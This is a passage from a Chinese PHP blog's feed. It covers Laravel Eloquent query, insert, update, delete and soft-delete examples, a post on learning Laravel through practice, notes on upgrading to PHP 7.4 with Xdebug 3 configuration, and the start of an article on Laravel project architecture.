User::all();</span><br><span class="line">$users = $users-&gt;each(<span class="function"><span class="keyword">function</span> <span class="params">($user , $key)</span> </span>&#123;</span><br><span class="line">    $user-&gt;password = bcrypt(<span class="number">122410</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 返回结果包含完整的User模型，其中password 字段的值被修改</span></span><br></pre></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>如果想对集合中的所有元素进行迭代，对它们进行修改，并返回包含修改的新集合，那么需要使用<code>map</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$users = User::all();</span><br><span class="line">$users = $users-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($user, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">"name"</span> =&gt; $user-&gt;name,</span><br><span class="line">        <span class="string">"password"</span> =&gt; bcrypt(<span class="number">122410</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 返回结果仅包含name 和password 字段，其中password 字段的值被修改</span></span><br></pre></td></tr></table></figure><h3 id="聚合方法"><a href="#聚合方法" class="headerlink" title="聚合方法"></a>聚合方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 统计总数</span></span><br><span class="line">$count = User::count();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计分组</span></span><br><span class="line">$count = User::groupBy(<span class="string">"is_enable"</span>)-&gt;selectRaw(<span class="string">"count(id) as aggregate"</span>)-&gt;get();</span><br><span class="line"><span class="comment">// 注意不能这样写：User::select('count(id) as aggregate')-&gt;groupBy("is_enable")-&gt;get();</span></span><br></pre></td></tr></table></figure><h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><p>构建复杂查询：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 组合查询方式一</span></span><br><span class="line">$where = [];</span><br><span class="line">$where[] = [<span class="string">"is_enable"</span>, <span class="number">1</span>];</span><br><span class="line">$where[] = [</span><br><span class="line">  <span class="function"><span class="keyword">function</span><span class="params">($query)</span></span>&#123;</span><br><span class="line">  $query-&gt;where(<span class="string">"id"</span>, <span class="string">"&gt;"</span>, <span class="number">10</span>)</span><br><span class="line">    -&gt;orWhere(<span class="string">"name"</span>, <span class="string">"like"</span>, <span class="string">"%admin%"</span>);</span><br><span class="line">&#125;];</span><br><span class="line">User::select(<span class="string">"id"</span>, <span class="string">"name as username"</span>, <span class="string">"email"</span>)-&gt;where($where)-&gt;get(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 组合查询方式二</span></span><br><span class="line">$builder = User::select(<span class="string">"id"</span>, <span class="string">"name as username"</span>, <span class="string">"email"</span>);</span><br><span class="line">$builder-&gt;where(<span class="string">"is_enable"</span>, <span class="number">1</span>);</span><br><span class="line">$builder-&gt;where(<span class="function"><span class="keyword">function</span> <span class="params">($query)</span></span>&#123;</span><br><span class="line">  $query-&gt;where(<span class="string">"id"</span>, <span class="string">"&gt;"</span>, <span class="number">10</span>)</span><br><span class="line">    -&gt;orWhere(<span class="string">"name"</span>, <span class="string">"like"</span>, <span class="string">"%admin%"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$users = $builder-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两种方式的查询SQL 是一样的： select `id`, `name` as `username`, `email` from `users` where (`is_enable` = '1' and (`id` &gt; '10' or `name` like '%admin%'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Where Exists</span></span><br><span class="line">$builder = User::select(<span class="string">"id"</span>, <span class="string">"name"</span>, <span class="string">"email"</span>);</span><br><span class="line">$builder-&gt;whereExists(<span class="function"><span class="keyword">function</span> <span class="params">($query)</span></span>&#123;</span><br><span class="line">    $query-&gt;select(User::raw(<span class="number">1</span>))</span><br><span class="line">        -&gt;from(<span class="string">"topics"</span>)</span><br><span class="line">        -&gt;whereRaw(<span class="string">"topics.user_id = users.id"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 查询发过文章的用户</span></span><br></pre></td></tr></table></figure><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用户id 倒序</span></span><br><span class="line">$user = User::orderBy(<span class="string">"id"</span>, <span class="string">"desc"</span>)-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取created_at 最大的一条记录</span></span><br><span class="line">$user = User::latest()-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取created_at 最小的一条记录</span></span><br><span class="line">$user = User::oldest()-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机一条记录</span></span><br><span class="line">$users = User::inRandomOrder()-&gt;first();</span><br></pre></td></tr></table></figure><h3 id="限定"><a href="#限定" class="headerlink" title="限定"></a>限定</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 跳过前两条记录，取三条记录</span></span><br><span class="line">$users = User::skip(<span class="number">2</span>)-&gt;take(<span class="number">3</span>)-&gt;get();</span><br><span class="line"><span class="comment">// 输出SQL：select * from `users` limit 3 offset 2  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同上</span></span><br><span class="line">$users = User::offset(<span class="number">2</span>)-&gt;limit(<span class="number">3</span>)-&gt;get();</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用别名</span></span><br><span class="line">$user = User::select(<span class="string">"name as username"</span>, <span class="string">"id"</span>)-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个查询构建器</span></span><br><span class="line">$builder = User::select(<span class="string">"name"</span>);</span><br><span class="line"><span class="comment">// 添加一个查询列到已存在的 select 子句</span></span><br><span class="line">$user = $builder-&gt;addSelect(<span class="string">"id"</span>)-&gt;first();</span><br></pre></td></tr></table></figure><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$users &#x3D; User::paginate(10);</span><br><span class="line">$users &#x3D; User::simplePaginate(10);</span><br></pre></td></tr></table></figure><ol><li><code>paginate</code> 方法，返回<code>Illuminate\Pagination\LengthAwarePaginator</code>实例</li><li><code>simplePaginate</code> 方法，返回<code>Illuminate\Pagination\Paginator</code>实例</li></ol><p>每个分页器实例都可以通过以下方法提供更多分页信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$result-&gt;count()            &#x2F;&#x2F; 当前页条数    </span><br><span class="line">$result-&gt;currentPage()      &#x2F;&#x2F; 当前页码</span><br><span class="line">$result-&gt;perPage()          &#x2F;&#x2F; 每页多少条</span><br><span class="line">$result-&gt;total()            &#x2F;&#x2F; 总数(使用simplePaginate 时无效)</span><br><span class="line">$result-&gt;hasMorePages()     &#x2F;&#x2F; 是否有更多</span><br><span class="line">$result-&gt;firstItem()      </span><br><span class="line">$result-&gt;lastItem()</span><br><span class="line">$result-&gt;lastPage() (使用simplePaginate 时无效)</span><br><span class="line">$result-&gt;nextPageUrl()</span><br><span class="line">$result-&gt;previousPageUrl()</span><br><span class="line">$result-&gt;url($page)</span><br></pre></td></tr></table></figure><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p>单条插入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;name = <span class="string">"yumi"</span>;</span><br><span class="line">$user-&gt;fill([<span class="string">"email"</span> =&gt; <span class="string">"yumi@example.com"</span>]);</span><br><span class="line">$user-&gt;save();</span><br><span class="line"><span class="comment">// 返回模型对象</span></span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> User(</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"boo"</span>, <span class="string">'email'</span> =&gt; <span class="string">'boo@example.com'</span>]</span><br><span class="line">);</span><br><span class="line">$user-&gt;save();</span><br><span class="line"></span><br><span class="line">$result = User::create(</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"boo"</span>, <span class="string">'email'</span> =&gt; <span class="string">'boo@example.com'</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 返回模型对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 单条插入，并返回对应 ID</span></span><br><span class="line">$result = User::insertGetId(</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"boo"</span>, <span class="string">'email'</span> =&gt; <span class="string">'boo@example.com'</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 返回插入记录对应ID</span></span><br></pre></td></tr></table></figure><p>批量插入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$result = User::insert([</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"boo"</span>, <span class="string">'email'</span> =&gt; <span class="string">'boo@example.com'</span>]</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"yumi"</span>, <span class="string">'email'</span> =&gt; <span class="string">'yumi@example.com'</span>]</span><br><span class="line">]);</span><br><span class="line"><span class="comment">// 返回Boolean</span></span><br></pre></td></tr></table></figure><p>注意⚠️：此时不会触发saving、saved 模型事件</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>单条更新</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$user = User::find(<span class="number">1</span>);</span><br><span class="line">$user-&gt;name = <span class="string">'yumi'</span>;</span><br><span class="line">$user-&gt;save();</span><br><span class="line"><span class="comment">// 返回Boolean</span></span><br><span class="line"></span><br><span class="line">$user = User::find(<span class="number">1</span>);</span><br><span class="line">$user-&gt;update($data);</span><br><span class="line"><span class="comment">// 返回受影响行数</span></span><br><span class="line"></span><br><span class="line">$user = User::where(<span class="string">"id"</span>, <span class="number">1</span>)-&gt;update([<span class="string">'password'</span> =&gt; bcrypt(<span class="number">122410</span>)]);</span><br><span class="line"><span class="comment">// 返回受影响行数</span></span><br></pre></td></tr></table></figure><p>批量更新：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user = User::whereIn(<span class="string">"id"</span>, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])-&gt;update([<span class="string">'password'</span> =&gt; bcrypt(<span class="number">122410</span>)]); </span><br><span class="line"><span class="comment">// 返回受影响行数</span></span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>单个删除</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过主键查询，删除模型</span></span><br><span class="line">$user = User::find(<span class="number">1</span>);</span><br><span class="line">$user-&gt;delete();</span><br><span class="line"><span class="comment">// 返回Boolean</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接通过主键删除</span></span><br><span class="line">User::destroy(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 返回受影响行数</span></span><br><span class="line"></span><br><span class="line">User::where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;delete();</span><br></pre></td></tr></table></figure><p>批量删除：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User::destroy([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">User::destroy(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// 注：通过 Eloquent 批量删除时，deleting 和 deleted事件不会被触发，因为在进行模型删除时不会获取模型。</span></span><br><span class="line"></span><br><span class="line">User::whereIn(<span class="string">'id'</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])-&gt;delete();</span><br><span class="line"><span class="comment">// 均返回受影响行数</span></span><br></pre></td></tr></table></figure><h3 id="软删除"><a href="#软删除" class="headerlink" title="软删除"></a>软删除</h3><p>除了真实删除数据库记录，Eloquent 也可以「软删除」模型。软删除的模型并不是真的从数据库中删除了。 事实上，是在模型上设置了 <code>deleted_at</code> 属性并将其值写入数据库。如果 <code>deleted_at</code> 值非空，代表这个模型已被软删除。</p><p>如果要开启模型软删除功能，需要做好三件事情：</p><ol><li>数据库增加<code>deleted_at</code> 字段</li><li>在模型上导入 <code>Illuminate\Database\Eloquent\SoftDeletes</code>特征</li><li>同时将<code>deleted_at</code> 列添加到 <code>$dates</code> 属性</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">SoftDeletes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">SoftDeletes</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> $dates = [<span class="string">'deleted_at'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，当在模型实例上使用 <code>delete</code> 方法，当前日期时间会写入 <code>deleted_at</code> 字段。同时，查询出来的结果也会自动排除已被软删除的记录。</p><h3 id="软删除常见操作"><a href="#软删除常见操作" class="headerlink" title="软删除常见操作"></a>软删除常见操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证给定的模型实例是否已被软删除</span></span><br><span class="line"><span class="keyword">if</span> ($user-&gt;trashed()) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 包括已软删除的模型</span></span><br><span class="line">$users = User::withTrashed()-&gt;get();</span><br><span class="line">            </span><br><span class="line"><span class="comment">// 只检索软删除模型           </span></span><br><span class="line">$users = User::onlyTrashed()-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 永久删除</span></span><br><span class="line">$user-&gt;forceDelete();</span><br></pre></td></tr></table></figure><p>注意⚠️：</p><ol><li>通过 Eloquent 批量删除时，deleting 和 deleted 事件不会被触发，因为在进行模型删除时不会获取模型。</li><li>通过 Eloquent 批量更新时，更新的模型不会触发 saving, saved, updating 和 updated 模型事件。这是因为在批量更新时实际上从未检索模型。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/docs/laravel/8.x/eloquent/9406#soft-deleting" target="_blank" rel="noopener">Eloquent 快速入门</a></li><li><a href="https://segmentfault.com/a/1190000014916636" target="_blank" rel="noopener">Laravel 中Eloquent ORM 相关操作</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Laravel 支持原生的 SQL 查询、流畅的查询构造器 和 Eloquent ORM 三种查询方式：&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>谈谈第一次使用 Laravel 开发的感想</title>
    <link href="https://www.0x2beace.com/talk-about-the-feelings-of-using-laravel-development-for-the-first-time/"/>
    <id>https://www.0x2beace.com/talk-about-the-feelings-of-using-laravel-development-for-the-first-time/</id>
    <published>2021-04-03T04:36:54.000Z</published>
    <updated>2021-04-03T09:35:09.242Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来记录一下使用Laravel 开发的一些感想。</p><a id="more"></a><p>笔者最早接触的第一个PHP 框架是<code>ThinkPHP 3.2</code>，写过接口，做过网站。</p><p>后来发现了<a href="http://laravel.com" target="_blank" rel="noopener">Laravel</a> 这个框架，那时最新的版本是5.x，当时就觉得这个框架可真高级，好多从未了解到的概念。</p><p>也正是从那个时候开始了解Laravel，通过<a href="https://learnku.com/" target="_blank" rel="noopener">learnku</a> 上的系列课程进行学习，</p><p>前前后后也是花了不少时间在上面，始终没机会进入项目实战，一直停留在学习层面。</p><p>今年的第一个项目有幸使用Laravel 从零开发，当我再次捡起之前看过的课程，感觉几乎白看了，好多点完全都没印象了。</p><p>有幸遇到一位不错的项目组长，项目开发初期给了一些时间去做准备。</p><p>这一周是新项目正式开始的第一周，项目进展挺顺利的（没有拖后腿 😀），不得不说使用Laravel 开发的效率真的很高，丰富的第三方扩展包可以满足日常开发的绝大多数应用场景。</p><p>这不禁让我引发思考，为什么之前花更多的时间和精力去学习，却还没有这短短半个月的收获大呢？</p><hr><p>原因很简单：<strong>编程是技能，不是知识，技能只有在不断练习下才会有进步</strong> 。</p><p>借用一句老话来讲就是：<strong>纸上得来终觉浅，绝知此事要躬行。</strong></p><p>现在再回头看看<code>learnku.com</code> 的站长，在介绍<a href="https://learnku.com/courses/laravel-essential-training/8.x/reading-guide/9794" target="_blank" rel="noopener">如何正确阅读本书</a>时，说的一段话，真的特别好，强调“刻意练习”的重要性。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210403123344.png" alt=""></p><p>所以不能总是停留在学习阶段，有一定基础之后，就去做，遇到问题解决问题，不用太在意结果如何，动手去做就好了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来记录一下使用Laravel 开发的一些感想。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    <category term="一些思考" scheme="https://www.0x2beace.com/categories/PHP/Laravel/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
    <category term="一些思考" scheme="https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>记一次升级 PHP 引发的一些思考</title>
    <link href="https://www.0x2beace.com/some-thoughts-caused-by-upgrading-php-at-a-time/"/>
    <id>https://www.0x2beace.com/some-thoughts-caused-by-upgrading-php-at-a-time/</id>
    <published>2021-03-31T15:27:38.000Z</published>
    <updated>2021-04-03T04:39:35.526Z</updated>
    
    <content type="html"><![CDATA[<p>因为工作原因，今天将本地开发环境的PHP 升级到7.4 了，此前一直使用7.3。</p><p>中间遇到了一些小问题，总体还算顺利，在此记录一下。</p><a id="more"></a><h3 id="背景说明"><a href="#背景说明" class="headerlink" title="背景说明"></a>背景说明</h3><p>我并没有使用集成的开发环境，而是单独安装所需的<code>5.6</code>、<code>7.0</code>、<code>7.1</code>、<code>7.2</code>、<code>7.3</code> 版本，所以升级<code>7.4</code> 也很简单，直接使用<code>brew</code> 安装即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install php@7.4</span><br></pre></td></tr></table></figure><p>但是这会带来一个新的问题：之前通过源码编译安装过的扩展，还需要再安装一次。</p><p>你可能会问，为什么还需要再安装一次呢？直接把<code>php.ini</code> 中的开启扩展配拷贝过去不就可以了吗？</p><p>我们来试试这样做会发生什么？</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210331215353.png" alt=""></p><p>可以看到 PHP 并没有正常加载该扩展，这是为啥呢？</p><p>要回答这个问题，首先我们需要搞清楚，源码编译安装是怎么回事。</p><p>当我们执行<code>phpize</code> 命令后，会根据当前系统信息（PHP 版本）生成对应版本的扩展文件。</p><p>所以PHP7.3 编译生成的扩展自然就不能直接拿到PHP 7.4 中去使用了。</p><h3 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h3><p>另外想说一下Xdebug ，它是我一直在使用的一个调试扩展，非常强大。</p><p>在PHP 升起到7.4 之后，我一并安装了最新版的Xdebug（3.x），此前我一直使用 2.x 版本的，因为版本跨度比较大，刚开始问题挺多的，断点总是进不去。</p><p>起初我认为是新旧配置不兼容，挺多参数名称发生了变化，（具体可以看<a href="https://xdebug.org/docs/upgrade_guide/en" target="_blank" rel="noopener">这里</a>），当我把配置全部切换成适应新版本，还是进不去。</p><p>后来阴差阳错升级了PHPStorm，结果就能调试了…（升级之前的版本是 2020.1）</p><p>适应<code>xdebug 3.x</code>的配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pecl&#x2F;20190902&#x2F;xdebug.so</span><br><span class="line">xdebug.mode &#x3D; debug</span><br><span class="line">xdebug.client_host &#x3D; 127.0.0.1</span><br><span class="line">xdebug.client_port &#x3D; 9003</span><br><span class="line">xdebug.idekey&#x3D;PHPSTORM</span><br></pre></td></tr></table></figure><p>只是到最后我也没整明白到底是啥原因导致。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;因为工作原因，今天将本地开发环境的PHP 升级到7.4 了，此前一直使用7.3。&lt;/p&gt;
&lt;p&gt;中间遇到了一些小问题，总体还算顺利，在此记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="一些思考" scheme="https://www.0x2beace.com/categories/PHP/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="一些思考" scheme="https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>『转载』Laravel 中大型项目架构</title>
    <link href="https://www.0x2beace.com/laravel-medium-and-large-project-architecture/"/>
    <id>https://www.0x2beace.com/laravel-medium-and-large-project-architecture/</id>
    <published>2021-03-30T15:59:36.000Z</published>
    <updated>2021-03-30T16:00:43.872Z</updated>
    
    <content type="html"><![CDATA[<p>初学者学习 Laravel 时分两种，一种是乖乖的将程式填入 MVC 架构內，导致 controller 与 model 异常的肥大，日后一样很难维护；一种是常常不知道程式改写在哪一个 class 內而犹豫不決，毕竟传统 PHP 都是一个页面一个档案。本文整理出适合 Laravel 的中大型项目架构，兼具容易维护、容易扩充与容易重复使用的特点，并且容易测试。</p><a id="more"></a><p>一个项目只有 MVC 是不够的，我们需要更完整的项目架构。</p><h2 id="Controller-过于臃肿"><a href="#Controller-过于臃肿" class="headerlink" title="Controller 过于臃肿"></a>Controller 过于臃肿</h2><p>受RoR的影响，初学者常认为 MVC 架构就是 model ,view,controller :</p><ul><li>Model 就是资料库。</li><li>Controller 负责与 HTTP 交互，调用 model 与 view。</li><li>View 就是 HTML。</li></ul><p>假如依照这个定义，以下这些需求改写在哪里呢？</p><ol><li>发送 Email，使用外部 API。</li><li>使用 PHP 写的逻辑。</li><li>依需求将显示格式作转换。</li><li>依需求是否显示某些资料。</li><li>依需求显示不同资料。</li></ol><p>其中 1, 2 属于商业逻辑，而 3, 4, 5 属于显示逻辑，若依照一般人对 MVC 的定义，model 是资料库，而 view 又是 HTML，以上这些需求都不能写在 model 与 view，只能勉强写在 controller。</p><p>因此初学者开始将大量程式写在 controller，造成 controller 的肥大难以维护。</p><h2 id="Model-过于臃肿"><a href="#Model-过于臃肿" class="headerlink" title="Model 过于臃肿"></a>Model 过于臃肿</h2><p>既然逻辑写在 controller 不方便维护，那我将逻辑都写在 model 就好了？</p><p>当你将逻辑从 controller 搬到 model 后，虽然 controller 变瘦了，但却肥了 model，model 从原本代表资料库，現在变成还要负责商业逻辑与显示逻辑，结果更慘。</p><p>Model 代表资料库吗？把它想成是 Eloquent class就好，资料库逻辑应该写在 repository 里，这也是为什么 Laravel 5 已经沒有 models目录，Eloquent class 仅仅是放在 app 根目录下而已。</p><h2 id="中大型项目架构"><a href="#中大型项目架构" class="headerlink" title="中大型项目架构"></a>中大型项目架构</h2><p>那我们改怎么写呢？別将我们的思维局限在 MVC 內 :</p><ol><li>Model : 仅当成 Eloquent class。</li><li>Repository : 辅助 model，处理资料库逻辑，然后注入到 service。</li><li>Service : 辅助 controller，处理业务逻辑，然后注入到 controller。</li><li>Controller : 接收 HTTP request，调用其他 service。</li><li>Presenter : 处理显示逻辑，然后注入到 view。</li><li>View : 使用 blade 将资料 绑定 到 HTML。</li></ol><p>上面架构我们可以发现 MVC 架构还在，由与 SOLID 的单一职责原則与依赖反转原则:</p><p>我们将资料库逻辑从 model 分离出来，由 repository 辅助 model，将 model 依赖注入进 repository。<br>我们将商业逻辑从 controller 分离出来，由 service 辅助 controller，将 service 依赖注入进 controller。<br>我們将显示逻辑从 view 分离出來，由 presenter 辅助 view，将 presenter 依赖注入进 view。</p><h2 id="建立目录"><a href="#建立目录" class="headerlink" title="建立目录"></a>建立目录</h2><p>在 app 目录下建立 Repositories，Services 与 Presenters 目录。</p><p> 別害怕建立目录！！</p><p>別害怕在 Laravel 预设目录以外建立的其他目录，根据 SOLID 的单一职责原则，class 